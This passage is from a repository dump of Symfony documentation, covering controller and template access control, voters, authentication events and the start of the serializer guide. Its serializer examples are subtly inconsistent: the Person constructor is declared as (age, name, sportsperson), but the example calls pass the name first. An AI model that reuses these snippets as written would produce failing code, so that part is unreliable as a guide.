(which you can\n   :ref:`customize <controller-error-pages-by-status-code>`).\n\n.. _security-securing-controller-annotations:\n.. _security-securing-controller-attributes:\n\nAnother way to secure one or more controller actions is to use the ``#[IsGranted]`` attribute.\nIn the following example, all controller actions will require the\n``ROLE_ADMIN`` permission, except for ``adminDashboard()``, which will require\nthe ``ROLE_SUPER_ADMIN`` permission:\n\n.. code-block:: php-attributes\n\n    // src/Controller/AdminController.php\n    // ...\n\n    use Symfony\\Component\\Security\\Http\\Attribute\\IsGranted;\n\n    #[IsGranted('ROLE_ADMIN')]\n    class AdminController extends AbstractController\n    {\n        // Optionally, you can set a custom message that will be displayed to the user\n        #[IsGranted('ROLE_SUPER_ADMIN', message: 'You are not allowed to access the admin dashboard.')]\n        public function adminDashboard(): Response\n        {\n            // ...\n        }\n    }\n\nIf you want to use a custom status code instead of the default one (which\nis 403), this can be done by setting with the ``statusCode`` argument::\n\n    // src/Controller/AdminController.php\n    // ...\n\n    use Symfony\\Component\\Security\\Http\\Attribute\\IsGranted;\n\n    #[IsGranted('ROLE_ADMIN', statusCode: 423)]\n    class AdminController extends AbstractController\n    {\n        // ...\n    }\n\nYou can also set the internal exception code of the\n:class:`Symfony\\\\Component\\\\Security\\\\Core\\\\Exception\\\\AccessDeniedException`\nthat is thrown with the ``exceptionCode`` argument::\n\n    // src/Controller/AdminController.php\n    // ...\n\n    use Symfony\\Component\\Security\\Http\\Attribute\\IsGranted;\n\n    #[IsGranted('ROLE_ADMIN', statusCode: 403, exceptionCode: 10010)]\n    class AdminController extends AbstractController\n    {\n        // ...\n    }\n\n.. _security-template:\n\nAccess Control in Templates\n...........................\n\nIf you want to check if the current user has a certain role, you can use\nthe built-in ``is_granted()`` helper function in any Twig template:\n\n.. code-block:: html+twig\n\n    {% if is_granted('ROLE_ADMIN') %}\n        <a href=\"...\">Delete</a>\n    {% endif %}\n\n.. _security-isgranted:\n\nSecuring other Services\n.......................\n\nYou can check access *anywhere* in your code by injecting the ``Security``\nservice. For example, suppose you have a ``SalesReportManager`` service and you\nwant to include extra details only for users that have a ``ROLE_SALES_ADMIN`` role:\n\n.. code-block:: diff\n\n      // src/SalesReport/SalesReportManager.php\n\n      // ...\n      use Symfony\\Component\\Security\\Core\\Exception\\AccessDeniedException;\n    + use Symfony\\Bundle\\SecurityBundle\\Security;\n\n      class SalesReportManager\n      {\n    +     public function __construct(\n    +         private Security $security,\n    +     ) {\n    +     }\n\n          public function generateReport(): void\n          {\n              $salesData = [];\n\n    +         if ($this->security->isGranted('ROLE_SALES_ADMIN')) {\n    +             $salesData['top_secret_numbers'] = rand();\n    +         }\n\n              // ...\n          }\n\n          // ...\n      }\n\nIf you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,\nSymfony will automatically pass the ``security.helper`` to your service\nthanks to autowiring and the ``Security`` type-hint.\n\nYou can also use a lower-level\n:class:`Symfony\\\\Component\\\\Security\\\\Core\\\\Authorization\\\\AuthorizationCheckerInterface`\nservice. It does the same thing as ``Security``, but allows you to type-hint a\nmore-specific interface.\n\nAllowing Unsecured Access (i.e. Anonymous Users)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhen a visitor isn't yet logged in to your website, they are treated as\n\"unauthenticated\" and don't have any roles. This will block them from\nvisiting your pages if you defined an ``access_control`` rule.\n\nIn the ``access_control`` configuration, you can use the ``PUBLIC_ACCESS``\nsecurity attribute to exclude some routes for unauthenticated access (e.g.\nthe login page):\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n\n            # ...\n            access_control:\n                # allow unauthenticated users to access the login form\n                - { path: ^/admin/login, roles: PUBLIC_ACCESS }\n\n                # but require authentication for all other admin routes\n                - { path: ^/admin, roles: ROLE_ADMIN }\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config enable-authenticator-manager=\"true\">\n                <!-- ... -->\n\n                <access-control>\n                    <!-- allow unauthenticated users to access the login form -->\n                    <rule path=\"^/admin/login\" role=\"PUBLIC_ACCESS\"/>\n\n                    <!-- but require authentication for all other admin routes -->\n                    <rule path=\"^/admin\" role=\"ROLE_ADMIN\"/>\n                </access-control>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use Symfony\\Component\\Security\\Core\\Authorization\\Voter\\AuthenticatedVoter;\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            $security->enableAuthenticatorManager(true);\n            // ....\n\n            // allow unauthenticated users to access the login form\n            $security->accessControl()\n                ->path('^/admin/login')\n                ->roles([AuthenticatedVoter::PUBLIC_ACCESS])\n            ;\n\n            // but require authentication for all other admin routes\n            $security->accessControl()\n                ->path('^/admin')\n                ->roles(['ROLE_ADMIN'])\n            ;\n        };\n\nGranting Anonymous Users Access in a Custom Voter\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you're using a :doc:`custom voter </security/voters>`, you can allow\nanonymous users access by checking if there is no user set on the token::\n\n    // src/Security/PostVoter.php\n    namespace App\\Security;\n\n    // ...\n    use Symfony\\Component\\Security\\Core\\Authentication\\Token\\TokenInterface;\n    use Symfony\\Component\\Security\\Core\\Authentication\\User\\UserInterface;\n    use Symfony\\Component\\Security\\Core\\Authorization\\Voter\\Voter;\n\n    class PostVoter extends Voter\n    {\n        // ...\n\n        protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token): bool\n        {\n            // ...\n\n            if (!$token->getUser() instanceof UserInterface) {\n                // the user is not authenticated, e.g. only allow them to\n                // see public posts\n                return $subject->isPublic();\n            }\n        }\n    }\n\nSetting Individual User Permissions\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMost applications require more specific access rules. For instance, a user\nshould be able to only edit their *own* comments on a blog. Voters allow you\nto write *whatever* business logic you need to determine access. Using\nthese voters is similar to the role-based access checks implemented in the\nprevious chapters. Read :doc:`/security/voters` to learn how to implement\nyour own voter.\n\n.. _checking-to-see-if-a-user-is-logged-in-is-authenticated-fully:\n\nChecking to see if a User is Logged In\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you *only* want to check if a user is logged in (you don't care about roles),\nyou have the following two options.\n\nFirstly, if you've given *every* user ``ROLE_USER``, you can check for that role.\n\nSecondly, you can use the special \"attribute\" ``IS_AUTHENTICATED`` in place of a role::\n\n    // ...\n\n    public function adminDashboard(): Response\n    {\n        $this->denyAccessUnlessGranted('IS_AUTHENTICATED');\n\n        // ...\n    }\n\nYou can use ``IS_AUTHENTICATED`` anywhere roles are used: like\n``access_control`` or in Twig.\n\n``IS_AUTHENTICATED`` isn't a role, but it kind of acts like one, and every\nuser that has logged in will have this. Actually, there are some special attributes\nlike this:\n\n* ``IS_AUTHENTICATED_FULLY``: This is similar to ``IS_AUTHENTICATED_REMEMBERED``,\n  but stronger. Users who are logged in only because of a \"remember me cookie\"\n  will have ``IS_AUTHENTICATED_REMEMBERED`` but will not have ``IS_AUTHENTICATED_FULLY``.\n\n* ``IS_REMEMBERED``: *Only* users authenticated using the\n  :doc:`remember me functionality </security/remember_me>`, (i.e. a\n  remember-me cookie).\n\n* ``IS_IMPERSONATOR``: When the current user is\n  :doc:`impersonating </security/impersonating_user>` another user in this\n  session, this attribute will match.\n\n.. _user_session_refresh:\n\nUnderstanding how Users are Refreshed from the Session\n------------------------------------------------------\n\nAt the end of every request (unless your firewall is ``stateless``), your\n``User`` object is serialized to the session. At the beginning of the next\nrequest, it's deserialized and then passed to your user provider to \"refresh\" it\n(e.g. Doctrine queries for a fresh user).\n\nThen, the two User objects (the original from the session and the refreshed User\nobject) are \"compared\" to see if they are \"equal\". By default, the core\n``AbstractToken`` class compares the return values of the ``getPassword()``,\n``getSalt()`` and ``getUserIdentifier()`` methods. If any of these are different,\nyour user will be logged out. This is a security measure to make sure that malicious\nusers can be de-authenticated if core user data changes.\n\nHowever, in some cases, this process can cause unexpected authentication problems.\nIf you're having problems authenticating, it could be that you *are* authenticating\nsuccessfully, but you immediately lose authentication after the first redirect.\n\nIn that case, review the serialization logic (e.g. the ``__serialize()`` or\n``serialize()`` methods) on your user class (if you have any) to make sure\nthat all the fields necessary are serialized and also exclude all the\nfields not necessary to be serialized (e.g. Doctrine relations).\n\nComparing Users Manually with EquatableInterface\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOr, if you need more control over the \"compare users\" process, make your User class\nimplement :class:`Symfony\\\\Component\\\\Security\\\\Core\\\\User\\\\EquatableInterface`.\nThen, your ``isEqualTo()`` method will be called when comparing users instead\nof the core logic.\n\n.. _security-security-events:\n\nSecurity Events\n---------------\n\nDuring the authentication process, multiple events are dispatched that allow you\nto hook into the process or customize the response sent back to the user. You\ncan do this by creating an :doc:`event listener or subscriber </event_dispatcher>`\nfor these events.\n\n.. tip::\n\n    Every Security firewall has its own event dispatcher\n    (``security.event_dispatcher.FIREWALLNAME``). Events are dispatched on\n    both the global and the firewall-specific dispatcher. You can register\n    on the firewall dispatcher if you want your listener to only be\n    called for a specific firewall. For instance, if you have an ``api``\n    and ``main`` firewall, use this configuration to register only on the\n    logout event in the ``main`` firewall:\n\n    .. configuration-block::\n\n        .. code-block:: yaml\n\n            # config/services.yaml\n            services:\n                # ...\n\n                App\\EventListener\\LogoutSubscriber:\n                    tags:\n                        - name: kernel.event_subscriber\n                          dispatcher: security.event_dispatcher.main\n\n        .. code-block:: xml\n\n            <!-- config/services.xml -->\n            <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n            <container xmlns=\"http://symfony.com/schema/dic/services\"\n                xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                    https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n                <services>\n                    <!-- ... -->\n\n                    <service id=\"App\\EventListener\\LogoutSubscriber\">\n                        <tag name=\"kernel.event_subscriber\"\n                             dispatcher=\"security.event_dispatcher.main\"\n                         />\n                    </service>\n                </services>\n            </container>\n\n        .. code-block:: php\n\n            // config/services.php\n            namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n            use App\\EventListener\\LogoutSubscriber;\n\n            return function(ContainerConfigurator $container): void {\n                $services = $container->services();\n\n                $services->set(LogoutSubscriber::class)\n                    ->tag('kernel.event_subscriber', [\n                        'dispatcher' => 'security.event_dispatcher.main',\n                    ]);\n            };\n\nAuthentication Events\n~~~~~~~~~~~~~~~~~~~~~\n\n.. raw:: html\n\n    <object data=\"_images/security/security_events.svg\" type=\"image/svg+xml\"\n        alt=\"A flow diagram showing the authentication events that are described in this section in a request-response cycle.\"\n    ></object>\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\CheckPassportEvent`\n    Dispatched after the authenticator created the :ref:`security passport <security-passport>`.\n    Listeners of this event do the actual authentication checks (like\n    checking the passport, validating the CSRF token, etc.)\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\AuthenticationTokenCreatedEvent`\n    Dispatched after the passport was validated and the authenticator\n    created the security token (and user). This can be used in advanced use-cases\n    where you need to modify the created token (e.g. for multi factor\n    authentication).\n\n:class:`Symfony\\\\Component\\\\Security\\\\Core\\\\Event\\\\AuthenticationSuccessEvent`\n    Dispatched when authentication is nearing success. This is the last\n    event that can make an authentication fail by throwing an\n    ``AuthenticationException``.\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\LoginSuccessEvent`\n    Dispatched after authentication was fully successful. Listeners to this\n    event can modify the response sent back to the user.\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\LoginFailureEvent`\n    Dispatched after an ``AuthenticationException`` was thrown during\n    authentication. Listeners to this event can modify the error response\n    sent back to the user.\n\nOther Events\n~~~~~~~~~~~~\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\InteractiveLoginEvent`\n    Dispatched after authentication was fully successful only when the authenticator\n    implements :class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Authenticator\\\\InteractiveAuthenticatorInterface`,\n    which indicates login requires explicit user action (e.g. a login form).\n    Listeners to this event can modify the response sent back to the user.\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\LogoutEvent`\n    Dispatched just before a user logs out of your application. See\n    :ref:`security-logging-out`.\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\TokenDeauthenticatedEvent`\n    Dispatched when a user is deauthenticated, for instance because the\n    password was changed. See :ref:`user_session_refresh`.\n\n:class:`Symfony\\\\Component\\\\Security\\\\Http\\\\Event\\\\SwitchUserEvent`\n    Dispatched after impersonation is completed. See\n    :doc:`/security/impersonating_user`.\n\nFrequently Asked Questions\n--------------------------\n\n**Can I have Multiple Firewalls?**\n    Yes! However, each firewall is like a separate security system: being authenticated\n    in one firewall doesn't make you authenticated in another one. Each firewall can have\n    multiple ways of allowing authentication (e.g. form login, and API key authentication).\n    If you want to share authentication between firewalls, you have to explicitly\n    specify the same :ref:`reference-security-firewall-context` for different firewalls.\n\n**Security doesn't seem to work on my Error Pages**\n    As routing is done *before* security, 404 error pages are not covered by\n    any firewall. This means you can't check for security or even access the\n    user object on these pages. See :doc:`/controller/error_pages`\n    for more details.\n\n**My Authentication Doesn't Seem to Work: No Errors, but I'm Never Logged In**\n    Sometimes authentication may be successful, but after redirecting, you're\n    logged out immediately due to a problem loading the ``User`` from the session.\n    To see if this is an issue, check your log file (``var/log/dev.log``) for\n    the log message.\n\n**Cannot refresh token because user has changed**\n    If you see this, there are two possible causes. First, there may be a problem\n    loading your User from the session. See :ref:`user_session_refresh`. Second,\n    if certain user information was changed in the database since the last page\n    refresh, Symfony will purposely log out the user for security reasons.\n\nLearn More\n----------\n\nAuthentication (Identifying/Logging in the User)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. toctree::\n    :maxdepth: 1\n\n    security/passwords\n    security/ldap\n    security/remember_me\n    security/impersonating_user\n    security/user_checkers\n    security/firewall_restriction\n    security/csrf\n    security/form_login\n    security/custom_authenticator\n    security/entry_point\n\nAuthorization (Denying Access)\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. toctree::\n    :maxdepth: 1\n\n    security/voters\n    security/access_control\n    security/expressions\n    security/access_denied_handler\n    security/force_https\n\n.. _`HWIOAuthBundle`: https://github.com/hwi/HWIOAuthBundle\n.. _`OWASP Brute Force Attacks`: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks\n.. _`brute force login attacks`: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks\n.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n.. _`SymfonyCastsVerifyEmailBundle`: https://github.com/symfonycasts/verify-email-bundle\n.. _`HTTP Basic authentication`: https://en.wikipedia.org/wiki/Basic_access_authentication\n.. _`Login CSRF attacks`: https://en.wikipedia.org/wiki/Cross-site_request_forgery#Forging_login_requests\n.. _`PHP date relative formats`: https://www.php.net/manual/en/datetime.formats.php#datetime.formats.relative\n.. _`Oauth2-client`: https://github.com/thephpleague/oauth2-client\n"
        },
        {
          "name": "security",
          "type": "tree",
          "content": null
        },
        {
          "name": "serializer.rst",
          "type": "blob",
          "size": 76.287109375,
          "content": "How to Use the Serializer\n=========================\n\nSymfony provides a serializer to transform data structures from one format\nto PHP objects and the other way around.\n\nThis is most commonly used when building an API or communicating with third\nparty APIs. The serializer can transform an incoming JSON request payload\nto a PHP object that is consumed by your application. Then, when generating\nthe response, you can use the serializer to transform the PHP objects back\nto a JSON response.\n\nIt can also be used to for instance load CSV configuration data as PHP\nobjects, or even to transform between formats (e.g. YAML to XML).\n\n.. _activating_the_serializer:\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the serializer :ref:`Symfony pack <symfony-packs>` before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/serializer-pack\n\n.. note::\n\n    The serializer pack also installs some commonly used optional\n    dependencies of the Serializer component. When using this component\n    outside the Symfony framework, you might want to start with the\n    ``symfony/serializer`` package and install optional dependencies if you\n    need them.\n\n.. seealso::\n\n    A popular alternative to the Symfony Serializer component is the third-party\n    library, `JMS serializer`_.\n\nSerializing an Object\n---------------------\n\nFor this example, assume the following class exists in your project::\n\n    // src/Model/Person.php\n    namespace App\\Model;\n\n    class Person\n    {\n        public function __construct(\n            private int $age,\n            private string $name,\n            private bool $sportsperson\n        ) {\n        }\n\n        public function getAge(): int\n        {\n            return $this->age;\n        }\n\n        public function getName(): string\n        {\n            return $this->name;\n        }\n\n        public function isSportsperson(): bool\n        {\n            return $this->sportsperson;\n        }\n    }\n\nIf you want to transform objects of this type into a JSON structure (e.g.\nto send them via an API response), get the ``serializer`` service by using\nthe :class:`Symfony\\\\Component\\\\Serializer\\\\SerializerInterface` parameter type:\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        // src/Controller/PersonController.php\n        namespace App\\Controller;\n\n        use App\\Model\\Person;\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\JsonResponse;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Serializer\\SerializerInterface;\n\n        class PersonController extends AbstractController\n        {\n            public function index(SerializerInterface $serializer): Response\n            {\n                $person = new Person('Jane Doe', 39, false);\n\n                $jsonContent = $serializer->serialize($person, 'json');\n                // $jsonContent contains {\"name\":\"Jane Doe\",\"age\":39,\"sportsperson\":false}\n\n                return JsonResponse::fromJsonString($jsonContent);\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use App\\Model\\Person;\n        use Symfony\\Component\\Serializer\\Encoder\\JsonEncoder;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n        use Symfony\\Component\\Serializer\\Serializer;\n\n        $encoders = [new JsonEncoder()];\n        $normalizers = [new ObjectNormalizer()];\n        $serializer = new Serializer($normalizers, $encoders);\n\n        $person = new Person('Jane Done', 39, false);\n\n        $jsonContent = $serializer->serialize($person, 'json');\n        // $jsonContent contains {\"name\":\"Jane Doe\",\"age\":39,\"sportsperson\":false}\n\nThe first parameter of the :method:`Symfony\\\\Component\\\\Serializer\\\\Serializer::serialize`\nis the object to be serialized and the second is used to choose the proper\nencoder (i.e. format), in this case the :class:`Symfony\\\\Component\\\\Serializer\\\\Encoder\\\\JsonEncoder`.\n\n.. tip::\n\n    When your controller class extends ``AbstractController`` (like in the\n    example above), you can simplify your controller by using the\n    :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::json`\n    method to create a JSON response from an object using the Serializer::\n\n        class PersonController extends AbstractController\n        {\n            public function index(): Response\n            {\n                $person = new Person('Jane Doe', 39, false);\n\n                // when the Serializer is not available, this will use json_encode()\n                return $this->json($person);\n            }\n        }\n\nUsing the Serializer in Twig Templates\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can also serialize objects in any Twig template using the ``serialize``\nfilter:\n\n.. code-block:: twig\n\n    {{ person|serialize(format = 'json') }}\n\nSee the :ref:`twig reference <reference-twig-filter-serialize>` for more\ninformation.\n\nDeserializing an Object\n-----------------------\n\nAPIs often also need to convert a formatted request body (e.g. JSON) to a\nPHP object. This process is called *deserialization* (also known as \"hydration\"):\n\n.. configuration-block::\n\n    .. code-block:: php-symfony\n\n        // src/Controller/PersonController.php\n        namespace App\\Controller;\n\n        // ...\n        use Symfony\\Component\\HttpFoundation\\Exception\\BadRequestException;\n        use Symfony\\Component\\HttpFoundation\\Request;\n\n        class PersonController extends AbstractController\n        {\n            // ...\n\n            public function create(Request $request, SerializerInterface $serializer): Response\n            {\n                if ('json' !== $request->getContentTypeFormat()) {\n                    throw new BadRequestException('Unsupported content format');\n                }\n\n                $jsonData = $request->getContent();\n                $person = $serializer->deserialize($jsonData, Person::class, 'json');\n\n                // ... do something with $person and return a response\n            }\n        }\n\n    .. code-block:: php-standalone\n\n        use App\\Model\\Person;\n        use Symfony\\Component\\Serializer\\Encoder\\JsonEncoder;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n        use Symfony\\Component\\Serializer\\Serializer;\n\n        // ...\n        $jsonData = ...; // fetch JSON from the request\n        $person = $serializer->deserialize($jsonData, Person::class, 'json');\n\nIn this case, :method:`Symfony\\\\Component\\\\Serializer\\\\Serializer::deserialize`\nneeds three parameters:\n\n#. The data to be decoded\n#. The name of the class this information will be decoded to\n#. The name of the encoder used to convert the data to an array (i.e. the\n   input format)\n\nWhen sending a request to this controller (e.g.\n``{\"first_name\":\"John Doe\",\"age\":54,\"sportsperson\":true}``), the serializer\nwill create a new instance of ``Person`` and sets the properties to the\nvalues from the given JSON.\n\n.. note::\n\n    By default, additional attributes that are not mapped to the\n    denormalized object will be ignored by the Serializer component. For\n    instance, if a request to the above controller contains ``{..., \"city\": \"Paris\"}``,\n    the ``city`` field will be ignored. You can also throw an exception in\n    these cases using the :ref:`serializer context <serializer-context>`\n    you'll learn about later.\n\n.. seealso::\n\n    You can also deserialize data into an existing object instance (e.g.\n    when updating data). See :ref:`Deserializing in an Existing Object <serializer-populate-existing-object>`.\n\n.. _serializer-process:\n\nThe Serialization Process: Normalizers and Encoders\n---------------------------------------------------\n\nThe serializer uses a two-step process when (de)serializing objects:\n\n.. raw:: html\n\n    <object data=\"_images/serializer/serializer_workflow.svg\" type=\"image/svg+xml\"\n        alt=\"A flow diagram showing how objects are serialized/deserialized. This is described in the subsequent paragraph.\"\n    ></object>\n\nIn both directions, data is always first converted to an array. This splits\nthe process in two separate responsibilities:\n\nNormalizers\n    These classes convert **objects** into **arrays** and vice versa. They\n    do the heavy lifting of finding out which class properties to\n    serialize, what value they hold and what name they should have.\nEncoders\n    Encoders convert **arrays** into a specific **format** and the other\n    way around. Each encoder knows exactly how to parse and generate a\n    specific format, for instance JSON or XML.\n\nInternally, the ``Serializer`` class uses a sorted list of normalizers and\none encoder for the specific format when (de)serializing an object.\n\nThere are several normalizers configured in the default ``serializer``\nservice. The most important normalizer is the\n:class:`Symfony\\\\Component\\\\Serializer\\\\Normalizer\\\\ObjectNormalizer`. This\nnormalizer uses reflection and the :doc:`PropertyAccess component </components/property_access>`\nto transform between any object and an array. You'll learn more about\n:ref:`this and other normalizers <serializer-normalizers>` later.\n\nThe default serializer is also configured with some encoders, covering the\ncommon formats used by HTTP applications:\n\n* :class:`Symfony\\\\Component\\\\Serializer\\\\Encoder\\\\JsonEncoder`\n* :class:`Symfony\\\\Component\\\\Serializer\\\\Encoder\\\\XmlEncoder`\n* :class:`Symfony\\\\Component\\\\Serializer\\\\Encoder\\\\CsvEncoder`\n* :class:`Symfony\\\\Component\\\\Serializer\\\\Encoder\\\\YamlEncoder`\n\nRead more about these encoders and their configuration in\n:doc:`/serializer/encoders`.\n\n.. tip::\n\n    The `API Platform`_ project provides encoders for more advanced\n    formats:\n\n    * `JSON-LD`_ along with the `Hydra Core Vocabulary`_\n    * `OpenAPI`_ v2 (formerly Swagger) and v3\n    * `GraphQL`_\n    * `JSON:API`_\n    * `HAL`_\n\n.. _serializer-context:\n\nSerializer Context\n~~~~~~~~~~~~~~~~~~\n\nThe serializer, and its normalizers and encoders, are configured through\nthe *serializer context*. This context can be configured in multiple\nplaces:\n\n* :ref:`Globally through the framework configuration <serializer-default-context>`\n* :ref:`While serializing/deserializing <serializer-context-while-serializing-deserializing>`\n* :ref:`For a specific property <serializer-using-context-builders>`\n\nYou can use all three options at the same time. When the same setting is\nconfigured in multiple places, the latter in the list above will override\nthe previous one (e.g. the setting on a specific property overrides the one\nconfigured globally).\n\n.. _serializer-default-context:\n\nConfigure a Default Context\n...........................\n\nYou can configure a default context in the framework configuration, for\ninstance to disallow extra fields while deserializing:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/serializer.yaml\n        framework:\n            serializer:\n                default_context:\n                    allow_extra_attributes: false\n\n    .. code-block:: xml\n\n        <!-- config/packages/serializer.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:serializer>\n                    <framework:default-context>\n                        <framework:allow-extra-attributes>false</framework:allow-extra-attributes>\n                    </framework:default-context>\n                </framework:serializer>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/serializer.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->serializer()\n                ->defaultContext('', [\n                    'allow_extra_attributes' => false,\n                ])\n            ;\n        };\n\n    .. code-block:: php-standalone\n\n        use Symfony\\Component\\Serializer\\NameConverter\\CamelCaseToSnakeCaseNameConverter;\n        use Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer;\n\n        // ...\n        $normalizers = [\n            new ObjectNormalizer(null, null, null, null, null, null, [\n                'allow_extra_attributes' => false,\n            ]),\n        ];\n        $serializer = new Serializer($normalizers, $encoders);\n\n.. _serializer-context-while-serializing-deserializing:\n\nPass Context while Serializing/Deserializing\n............................................\n\nYou can also configure the context for a single call to\n``serialize()``/``deserialize()``. For instance, you can skip\nproperties with a ``null`` value only for one serialize call::\n\n    use Symfony\\Component\\Serializer\\Normalizer\\AbstractObjectNormalizer;\n\n    // ...\n    $serializer->serialize($person, 'json', [\n        AbstractObjectNormalizer::SKIP_NULL_VALUES => true\n    ]);\n\n    // next calls to serialize() will NOT skip null values\n\n.. _serializer-using-context-builders:\n\nUsing Context Builders\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nYou can use \"context builders\" to help define the (de)serialization\ncontext. Context builders are PHP objects that provide autocompletion,\nvalidation, and documentation of context options::\n\n    use Symfony\\Component\\Serializer\\Context\\Normalizer\\DateTimeNormalizerContextBuilder;\n\n    $contextBuilder = (new DateTimeNormalizerContextBuilder())\n        ->withFormat('Y-m-d H:i:s');\n    $serializer->serialize($something, 'json', $contextBuilder->toArray());\n\nEach normalizer/encoder has its related context builder. To create a more\ncomplex (de)serialization context, you can chain them using the\n``withContext()`` method::\n\n    use Symfony\\Component\\Serializer\\Context\\Encoder\\CsvEncoderContextBuilder;\n    use Symfony\\Component\\Serializer\\Context\\Normalizer\\ObjectNormalizerContextBuilder;\n\n    $initialContext = [\n        'custom_key' => 'custom_value',\n    ];\n\n    $contextBuilder = (new ObjectNormalizerContextBuilder())\n        ->withContext($initialContext)\n        ->withGroups(['group1', 'group2']);\n\n    $contextBuilder = (new CsvEncoderContextBuilder())\n        ->withContext($contextBuilder)\n        ->withDelimiter(';');\n\n    $serializer->serialize($something, 'csv', $contextBuilder->toArray());\n\n.. seealso::\n\n    You can also :doc:`create your context builders </serializer/custom_context_builders>`\n    to have autocompletion, validation, and documentation for your custom\n    context values.\n\nConfigure Context on a Specific Property\n........................................\n\nAt last, you can also configure context values on a specific object\nproperty. For instance, to configure the datetime format:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Model/Person.php\n\n        // ...\n        use Symfony\\Component\\Serializer\\Attribute\\Context;\n        use Symfony\\Component\\Serializer\\Normalizer\\DateTimeNormalizer;\n\n        class Person\n        {\n            #[Context([DateTimeNormalizer::FORMAT_KEY => 'Y-m-d'])]\n            public \\DateTimeImmutable $createdAt;\n\n            // ...\n        }\n\n    .. code-block:: yaml\n\n        # config/serializer/person.yaml\n        App\\Model\\Person:\n            attributes:\n                createdAt:\n                    contexts:\n                        - context: { datetime_format: 'Y-m-d' }\n\n    .. code-block:: xml\n\n        <!-- config/serializer/person.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <serializer xmlns=\"http://symfony.com/schema/dic/serializer-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/serializer-mapping\n                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd\"\n        >\n            <class name=\"App\\Model\\Person\">\n                <attribute name=\"createdAt\">\n                    <context>\n                        <entry name=\"datetime_format\">Y-m-d</entry>\n                    </context>\n                </attribute>\n            </class>\n        </serializer>\n\n.. note::\n\n    When using YAML or XML, the mapping files must be placed in one of\n    these locations:\n\n    * All ``*.yaml`` and ``*.xml`` files in the ``config/serializer/``\n      directory.\n    * The ``serialization.yaml`` or ``serialization.xml`` file in the\n      ``Resources/config/`` directory of a bundle;\n    * All ``*.yaml`` and ``*.xml`` files in the ``Resources/config/serialization/``\n      directory of a bundle.\n\nYou can also specify a context specific to normalization or denormalization:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n    